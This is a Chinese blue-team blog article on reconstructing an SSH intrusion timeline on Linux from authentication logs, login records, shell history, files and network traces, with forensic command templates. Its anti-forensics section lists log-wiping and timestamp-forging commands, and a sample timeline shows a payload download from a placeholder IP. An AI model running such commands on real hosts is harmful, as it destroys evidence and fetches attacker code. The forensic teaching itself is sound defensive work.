---
title: "Linux日志时间线分析与SSH入侵溯源"
date: 2026-06-15T10:00:00+08:00
draft: false
weight: 40
description: "围绕 auth.log、secure、wtmp、bash_history 与 Web 日志，构建 Linux 主机入侵后的时间线分析方法，定位爆破、成功登录、提权与横向移动痕迹。"
categories: ["应急响应", "取证分析"]
tags: ["Linux", "SSH", "日志分析", "时间线", "横向移动", "蓝队实战"]
---

# Linux日志时间线分析与SSH入侵溯源

在 `0x02电子取证` 中，我们已经把 Linux 侧常见证据源梳理出来，例如 `/var/log/secure`、`/var/log/auth.log`、`wtmp`、`lastlog`、Web 访问日志与命令历史文件。真正困难的部分并不是“把日志拷出来”，而是如何把这些分散的文本、二进制记录和访问痕迹，拼接成一条可落地的攻击时间线。

本文聚焦 Linux 主机在应急响应中的**分析方法**：从 SSH 爆破到成功登录，从提权到横向移动，再到清痕与持久化，逐步恢复攻击者的行为路径。

---

## 0x01 先回答三个问题

面对一台疑似被入侵的 Linux 主机，蓝队应优先回答三个问题：

1. **攻击者是怎么进来的？**
   重点看 SSH、Web、计划任务、应用弱口令与公开暴露服务。
2. **攻击者进入后做了什么？**
   重点看命令执行、文件落地、提权、横向连接、打包外传。
3. **攻击者是否留下了回来的门？**
   重点看 SSH 公钥、计划任务、systemd 服务、`rc.local`、WebShell。

这三个问题决定了你如何组织时间线，而不是陷入日志海洋里逐行翻看。

---

## 0x02 SSH 入侵的核心证据链

Linux 主机最常见的初始突破面仍然是 SSH。不同发行版的关键文件略有区别：

- Debian/Ubuntu 常见为 `/var/log/auth.log`
- CentOS/RHEL 常见为 `/var/log/secure`
- 登录会话记录在 `/var/log/wtmp`、`/var/log/btmp`
- 用户最后登录信息在 `/var/log/lastlog`

### 1. 爆破阶段

典型特征是高频 `Failed password`、`Invalid user`、`authentication failure`。

分析重点：

- 统计失败源 IP 是否集中
- 观察是否针对多个用户名进行字典尝试
- 判断是否存在短时间、大范围的弱口令探测

常见分析命令：

```bash
grep "Failed password" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
grep "Invalid user" /var/log/secure | awk '{print $(NF-5)}' | sort | uniq -c | sort -nr
```

如果某个 IP 在几分钟内对 `root`、`admin`、`oracle`、`test` 等账户反复尝试，通常可判定为外部爆破或脚本化撞库。

### 2. 成功登录阶段

当日志出现 `Accepted password`、`Accepted publickey` 时，意味着攻击者已经拿到一条可用身份。

分析重点：

- 登录成功的源 IP 是否与此前爆破 IP 重合
- 成功登录的账号是否为高价值账号，例如 `root`
- 登录时间是否异常，例如凌晨、节假日、无人值守时段
- 登录后的 TTY、来源地理位置、会话时长是否可疑

常见分析命令：

```bash
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
last -ai
lastb -ai
lastlog
```

这里要特别注意一个误区：`Accepted publickey` 不代表就是合法登录，它常常说明攻击者**已经写入了恶意公钥**，下一步要马上检查 `~/.ssh/authorized_keys` 与文件修改时间。

### 3. 横向或代理登录阶段

攻击者拿到一台 Linux 服务器后，经常把它当作跳板机继续打内网。

重点异常：

- 某个低权限业务账号突然出现大量 `ssh` 外连
- 主机在夜间对内网多台服务器发起 22、3306、6379、445 等连接
- 登录后迅速执行 `curl`、`wget`、`scp`、`sshpass`、`socat`、`nc`

这时要把认证日志与网络连接信息结合分析，而不是只盯着 `auth.log`。

---

## 0x03 时间线拼接的四层视角

一条有效的 Linux 入侵时间线，通常由以下四层证据拼接而成。

### 1. 认证层

回答“谁从哪来，以什么方式进入”：

- `/var/log/secure` 或 `/var/log/auth.log`
- `wtmp` / `btmp`
- `last` / `lastb` / `lastlog`

### 2. 命令层

回答“进来之后敲了什么”：

- `~/.bash_history`
- `~/.zsh_history`
- `/root/.bash_history`
- `HISTTIMEFORMAT` 是否启用

但要注意，命令历史并不天然可信。攻击者可能：

- 执行 `history -c`
- 删除历史文件
- 使用 `unset HISTFILE`
- 使用非交互 shell 执行命令
- 通过脚本、计划任务或 WebShell 执行而不进入交互式终端

因此命令历史只能算**辅助证据**，必须和日志、文件时间戳、进程和网络痕迹互证。

### 3. 文件层

回答“落地了什么、改了什么”：

- `/tmp`、`/var/tmp`、`/dev/shm`
- 用户主目录中的隐藏文件
- `.ssh/authorized_keys`
- `/etc/passwd`、`/etc/shadow`、`/etc/sudoers`
- `/etc/cron*`、`/etc/systemd/system/`

分析时重点关注：

- 新增 ELF、脚本、压缩包
- 最近修改的服务配置与计划任务
- 明显伪装成系统组件的文件名，例如 `sysup`, `dbusd`, `kworker`

### 4. 网络层

回答“和谁通信、是否发生出站控制或数据外传”：

- Web 访问日志
- 防火墙日志
- 抓包文件或连接记录
- `~/.ssh/known_hosts`

若发现主机对外持续访问陌生 IP，且周期稳定、字节长度接近，需考虑该主机已被植入后门或 Beacon。

---

## 0x04 Linux 提权与持久化的分析重点

攻击者登录成功后，不会满足于普通用户权限，下一步通常是提权和建立持久化。

### 1. 提权分析

要重点检查以下行为：

- `sudo` 调用记录
- `su -` 用户切换
- 新增 UID 为 0 的异常账户
- SUID/SGID 异常文件
- 可写系统路径被植入恶意程序

典型命令：

```bash
grep "sudo" /var/log/secure
grep "session opened for user root" /var/log/secure
find / -perm -4000 -type f 2>/dev/null
awk -F: '($3 == 0) {print $1}' /etc/passwd
```

如果出现“普通业务账号登录 -> sudo 执行 -> 修改计划任务或写入公钥”的链条，基本可以还原一次典型的入侵升级过程。

### 2. 持久化分析

Linux 持久化通常偏好以下位置：

- `~/.ssh/authorized_keys`
- `/etc/crontab`、`/var/spool/cron/`
- `/etc/systemd/system/*.service`
- `/etc/rc.local`
- `/etc/profile`、`/etc/profile.d/`

攻击者偏爱的几个动作：

- 写入攻击者公钥实现免密重入
- 通过 `@reboot` 任务拉起下载器或反连木马
- 注册伪装成系统服务的 `systemd` 单元
- 在 `/etc/profile.d/` 中注入登录即执行的恶意脚本

这里与 `0x02` 的“启动项检查”“计划任务检查”天然衔接：采集阶段找证据点，分析阶段要判断这些证据**是否构成完整的驻留链**。

---

## 0x05 从 Web 入侵到 SSH 控制的串联分析

很多 Linux 服务器并不是先从 SSH 被打进来，而是先从 Web 业务突破。

常见链条如下：

1. Web 日志出现异常上传、命令执行或路径遍历请求
2. 攻击者通过 WebShell 执行 `whoami`、`uname -a`、`id`
3. 写入临时脚本到 `/tmp` 或下载 ELF
4. 添加新用户、公钥或计划任务
5. 改用 SSH 稳定接管主机

因此，一旦发现 Linux 主机存在 SSH 异常成功登录，要向前回溯：

- Web 日志是否在此前数分钟内出现敏感请求
- `/var/www`、应用目录、上传目录是否新增异常文件
- 是否存在 `curl | sh`、`wget` 拉载荷痕迹

只看 SSH，往往只能看到“控制已经建立”；把 Web、文件和认证日志串起来，才能看到“攻击是如何发生的”。

---

## 0x06 清痕与反取证识别

成熟攻击者会主动清痕。Linux 取证时要警惕以下异常：

- 关键日志文件体积突然变小
- 某些日志时段出现断层
- `bash_history` 时间明显晚于登录时间
- 只删除当前用户历史，遗漏 `root` 或其他运维账号历史
- `wtmp`、`btmp` 异常为空，或时间戳错乱

几个常见清痕动作：

- `history -c && history -w`
- `echo > /var/log/secure`
- `sed -i` 删除特定 IP 或关键词
- `touch -t` 伪造文件时间

判断反取证时，不要只看“有没有日志”，而要看**日志是否连续、时间是否闭环、不同来源是否互相印证**。

---

## 0x07 实战中的时间线构建方法

建议按如下顺序构建主机时间线：

1. 先锁定入侵窗口：从告警、异常进程、异常流量倒推到大致时间段。
2. 再抽认证日志：确认首次成功进入的身份、来源 IP 和方式。
3. 再看命令与文件：恢复攻击者落地、提权、持久化动作。
4. 最后关联网络：确认是否发生横向移动、C2 通信或数据外传。

如果条件允许，把多源证据统一成表格：

| 时间 | 证据源 | 行为 | 结论 |
| --- | --- | --- | --- |
| 02:13:21 | `/var/log/secure` | `Failed password` 高速出现 | 外部爆破开始 |
| 02:18:44 | `/var/log/secure` | `Accepted password for root` | 攻击者成功进入 |
| 02:19:01 | `~/.bash_history` | `curl -O http://x.x.x.x/a` | 下载载荷 |
| 02:20:10 | `/etc/cron.d/` 修改时间 | 新增计划任务 | 建立持久化 |
| 02:23:05 | Web / 流量日志 | 对外持续连接 | 疑似 C2 建立 |

这种“可交付”的时间线，比单纯罗列日志命令更适合实战汇报和后续处置。

---

## 0x08 公开案例与现场命令

### 1. 案例一：TeamTNT 在云主机中收集 SSH 密钥与云身份材料

Unit 42 在 2021 年披露的 TeamTNT 云环境活动里，给出了一条非常适合 Linux 主机取证落地的后渗透链：

- 攻击者先拿到云主机
- 随后运行脚本批量收集 AWS/GCP 身份材料
- 同时抓取本机和用户目录中的 SSH 密钥
- 继续枚举可执行程序、云资源和后续横向机会

这个案例的价值在于，它说明 Linux 主机上的 SSH 痕迹不能只看“有没有成功登录”，还要继续看：

- 登录后有没有搜集私钥、公钥与 `authorized_keys`
- 是否开始对其他主机发起 SSH、SCP、RSYNC
- 是否和云侧枚举行为形成闭环

公开来源：

- Unit 42: [TeamTNT Actively Enumerating Cloud Environments to Infiltrate Organizations](https://unit42.paloaltonetworks.com/teamtnt-operations-cloud-environments/)

### 2. 案例二：SSH 暴力破解仍然是高频初始入口

Kaspersky 2023 年 IoT 威胁报告虽然主要面向联网设备，但其中关于 SSH 暴力破解的统计非常适合用来说明一个现实问题：

- SSH 仍然是攻击者高频尝试的远程入口
- 一旦默认口令或弱口令存在，后续就很容易演变成任意命令执行和样本注入

虽然这不是单个主机案例，但对 Linux 取证章节非常实用，因为它能解释为什么：

- `Failed password`
- `Invalid user`
- 账号字典尝试

这些日志在应急里一直有实战价值。

公开来源：

- Securelist: [Overview of IoT threats in 2023](https://securelist.com/iot-threat-report-2023/110644/)

### 3. Linux 现场排查命令模板

#### 认证日志与爆破源 IP 统计

```bash
# Ubuntu / Debian
grep "Failed password" /var/log/auth.log* 2>/dev/null | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head
grep "Accepted " /var/log/auth.log* 2>/dev/null

# CentOS / RHEL
grep "Failed password" /var/log/secure* 2>/dev/null | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head
grep "Accepted " /var/log/secure* 2>/dev/null
```

#### 登录会话与失败登录

```bash
last -ai | head -n 50
lastb -ai | head -n 50
lastlog | head -n 50
```

#### 使用 journalctl 缩时间窗

```bash
journalctl --since "2026-06-15 00:00:00" --until "2026-06-15 06:00:00" -u ssh
journalctl --since "2026-06-15 00:00:00" --until "2026-06-15 06:00:00" | egrep 'sshd|sudo|su:|cron'
```

#### SSH 公钥与用户目录取证

```bash
find /root /home -maxdepth 3 -type f \( -name "authorized_keys" -o -name "known_hosts" -o -name "id_rsa" -o -name "id_ed25519" \) -ls 2>/dev/null
stat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null
grep -RIn "ssh-rsa\|ssh-ed25519" /root/.ssh /home/*/.ssh 2>/dev/null
```

#### 命令历史与横向工具

```bash
grep -RInE 'ssh |scp |rsync |sftp |sshpass|proxychains|socat|curl |wget ' /root/.bash_history /home/*/.bash_history 2>/dev/null
```

#### 临时目录与落地文件

```bash
find /tmp /var/tmp /dev/shm -type f -mtime -3 -ls 2>/dev/null
find /etc/cron* /var/spool/cron /etc/systemd/system -type f -mtime -3 -ls 2>/dev/null
```

### 4. 一条可直接执行的实战流程

如果你怀疑 Linux 主机是通过 SSH 进入并继续横向，建议按下面顺序执行：

1. 先查 `auth.log/secure` 里的 `Failed password` 和 `Accepted`
2. 再查 `last/lastb/lastlog` 是否和认证日志一致
3. 再查 `authorized_keys/known_hosts/id_rsa` 是否在同时间窗被访问或修改
4. 再查 `bash_history` 里是否出现 `ssh/scp/rsync/sshpass`
5. 最后再看 `/tmp`、`cron`、`systemd` 是否承接了后续驻留

这样就能把“外部登录 -> 公钥驻留 -> 横向移动 -> 持久化”收成一条完整时间线。

---

## 0x09 总结

Linux 主机取证最怕两件事：一是只会导日志不会分析，二是把单点异常误判成完整攻击链。真正有效的入侵溯源，必须把**认证日志、命令历史、文件落地与网络行为**拼成同一条时间线。

当你能回答“攻击者从哪里来、何时进入、如何提权、留下了什么后门、是否继续横向扩散”这五个问题时，`0x02电子取证` 的证据采集才算真正升级为 `0x03取证分析` 的作战能力。
